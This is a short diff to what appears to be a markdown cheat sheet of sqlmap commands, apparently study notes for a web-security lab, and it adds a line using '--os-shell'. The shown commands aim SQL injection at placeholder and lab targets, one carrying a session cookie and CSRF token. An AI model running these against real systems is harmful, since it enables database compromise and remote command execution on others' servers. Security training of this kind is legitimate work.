@@ -294,7 +294,7 @@ sqlmap -r req.txt
 sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
 sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
 sqlmap http://94.237.52.110:37168/case8.php --data 'id=1&t0ken=9XinKaZ3X99lxoZyRrHjzUCFepeu5JBwiNr3rq1ADeQ' --cookie='PHPSESSID=j0vf2nima13fs969k7rnr85ijb' --csrf-token='t0ken'N
-
+sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
 
   ## *Top 4 non-secure application*
